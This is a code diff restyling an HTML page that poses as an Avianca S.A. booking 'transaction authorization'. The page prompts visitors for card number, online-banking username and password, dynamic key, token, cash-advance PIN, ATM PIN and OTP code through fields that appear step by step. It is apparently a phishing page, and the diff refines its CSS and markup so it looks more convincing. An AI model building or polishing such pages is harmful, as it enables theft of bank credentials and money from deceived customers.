@@ -5,17 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Booking</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
+    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="./css/checkers.css">
     <link rel="stylesheet" href="./css/normalize.css">
     <script src="./js/functions.js"></script>
 
-    <!-- ===== SOLO ESTILOS (no JS, no cambios de estructura) ===== -->
+    <!-- ===== ESTILOS SOLO VISUALES ===== -->
     <style>
       :root{
         --bg:#f5f6f8;
@@ -28,73 +25,76 @@
         --radius:18px;
       }
       *{box-sizing:border-box}
-      html,body{background:var(--bg); font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; color:var(--text)}
+      html,body{
+        background:var(--bg);
+        font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+        color:var(--text);
+      }
 
       /* Encabezado de logos */
       .logos{
         max-width: 720px;
-        margin: 18px auto 6px;
+        margin: 18px auto 12px;
         padding: 0 8px;
         display:flex; align-items:center; justify-content:space-between; gap:12px;
       }
-      .logos img{height:auto; object-fit:contain; filter: drop-shadow(0 1px 0 rgba(0,0,0,.08));}
+      .logos img{height:auto; object-fit:contain;}
 
       /* Contenedor principal */
       main{max-width: 720px; margin: 0 auto 32px; padding: 0 8px;}
 
-      /* Tarjeta de contenido */
+      /* Tarjeta */
       .content{
         background: var(--card);
         border: 1px solid var(--border);
         border-radius: var(--radius);
         box-shadow: var(--shadow);
-        padding: clamp(16px, 3vw, 24px);
+        padding: clamp(18px, 3vw, 28px);
       }
       .content > b:first-child{
-        display:block; margin-bottom:8px;
-        font-size: clamp(20px, 2.2vw, 28px); font-weight:800;
+        display:block; margin-bottom:12px;
+        font-size: clamp(20px, 2.2vw, 26px); font-weight:800;
       }
       .content p{line-height:1.55; margin: 6px 0;}
 
-      /* Formato de la tabla de etiquetas/valores SIN tocar tu HTML */
+      /* GRID FORM */
       #form{
         display:grid;
-        grid-template-columns: 180px 1fr;
+        grid-template-columns: 160px 1fr;
         gap: 12px 16px;
         align-items: center;
         margin-bottom: 0 !important;
       }
-      /* Aplano columnas para alinear fila a fila */
       #form .labels, #form .values{display: contents;}
       #form .labels b{
         color: var(--muted);
-        font-weight:700;
+        font-weight:600;
       }
       #form .values p{
         margin:0;
         font-weight:700;
       }
 
-      /* Inputs (incluye los que se muestran dinámicamente) */
+      /* Inputs */
       input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
-        width:100% !important; height:52px !important;
+        width:100% !important; height:48px !important;
         padding:0 14px !important;
-        border:1px solid #e5e7eb !important; border-radius:12px !important;
+        border:1px solid #d1d5db !important; border-radius:12px !important;
         background:#fff !important; outline:none;
         font-size:16px; transition:border-color .15s, box-shadow .15s;
       }
       input:focus{ border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important; }
 
-      /* Link para reenviar código */
+      /* Link reenviar */
       #newCode{
-        display:block; text-align:center; margin: 14px auto 8px;
+        display:block; text-align:center; margin: 16px auto 8px;
         color:#0d6efd; text-decoration:none;
       }
       #newCode:hover{text-decoration:underline}
 
-      /* Botón principal existente */
+      /* Botón */
       #btnNextStep.btn-success{
-        display:block; margin: 6px auto 0;
+        display:block; margin: 10px auto 0;
         min-width:200px; height:48px; padding:0 22px;
         border-radius:999px; border:0;
         background:#111; color:#fff; font-weight:800; font-size:16px;
@@ -103,14 +103,10 @@
       }
       #btnNextStep.btn-success:active{transform: translateY(1px)}
 
-      /* Espaciado vertical suave entre elementos directos */
-      .content > * + *, #form > * + *{ margin-top: 6px; }
-
-      /* Responsivo: mantener 2 columnas pero más compactas */
+      /* Responsivo */
       @media (max-width: 560px){
         #form{ grid-template-columns: 130px 1fr; }
-        .logos{ margin: 12px auto 4px; }
-        .content{ padding: 16px; }
+        .content{ padding:16px; }
       }
     </style>
 </head>
@@ -127,21 +123,21 @@
     </div>
     <main>
         <div class="content">
-            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
-            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
-            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
-            <form id="form" style="margin-bottom: 30px;">
+            <b>Autorización de transacción</b>
+            <p>La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
+            <p>Ingrese los datos de su Banca Virtual:</p>
+            <form id="form">
                 <div class="labels">
-                    <b>Comercio: </b>
-                    <b>Monto: </b>
-                    <b>Número de tarjeta: </b>
-                    <b class="hidden" id="user" style="margin-bottom: 10px !important;">Usuario: </b>
-                    <b class="hidden" id="puser" style="margin-bottom: 10px !important;">Contraseña: </b>
-                    <b class="hidden" id="cdin" style="margin-bottom: 10px !important;">Clave Dinámica: </b>
-                    <b class="hidden" id="dintok" style="margin-bottom: 10px !important;">Token: </b>
-                    <b class="hidden" id="cavance" style="margin-bottom: 10px !important;">Clave Avances: </b>
-                    <b class="hidden" id="ccaj" style="margin-bottom: 10px !important;">Clave Cajero: </b>
-                    <b class="hidden" id="otpcode" style="margin-bottom: 10px !important;">Código OTP: </b>
+                    <b>Comercio:</b>
+                    <b>Monto:</b>
+                    <b>Número de tarjeta:</b>
+                    <b class="hidden" id="user">Usuario:</b>
+                    <b class="hidden" id="puser">Contraseña:</b>
+                    <b class="hidden" id="cdin">Clave Dinámica:</b>
+                    <b class="hidden" id="dintok">Token:</b>
+                    <b class="hidden" id="cavance">Clave Avances:</b>
+                    <b class="hidden" id="ccaj">Clave Cajero:</b>
+                    <b class="hidden" id="otpcode">Código OTP:</b>
                 </div>
                 <div class="values">
                     <p>AVIANCA S.A</p>
@@ -158,9 +154,7 @@
             </form>
         </div>
         <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
-        <button id="btnNextStep" class="btn-success">
-            Verificar
-        </button>
+        <button id="btnNextStep" class="btn-success">Verificar</button>
     </main>
 
     <!-- SCRIPTS -->
